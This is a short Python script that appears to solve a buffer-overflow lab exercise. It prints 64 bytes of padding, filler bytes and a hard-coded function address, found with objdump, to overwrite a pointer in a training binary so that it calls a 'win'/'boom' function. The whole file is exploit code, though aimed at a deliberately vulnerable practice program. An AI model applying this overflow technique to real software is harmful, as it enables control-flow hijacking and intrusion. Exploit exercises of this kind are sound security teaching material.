#!/usr/bin/python

# usage: ./pureOverflow <<< `./pure.py`

# we need to overflow the buffer into pf
# to call win()

# we find the address of win() with objdump
#      $ objdump -t stack3 | grep win
#
# jvo7822@nitron:/$ objdump -t pureOverflow | grep boom
#
# 0000000000400544 g F .text 0000000000000010 boom
#
# padding for the buffer and boom address
pad = 'A'*64
test = 'B'*4 + 'C'*4 + 'D'*4 + 'E'*4 #+ 'F'*4
winAddr = '\x44\x05\x40\x00'

print pad + test + winAddr
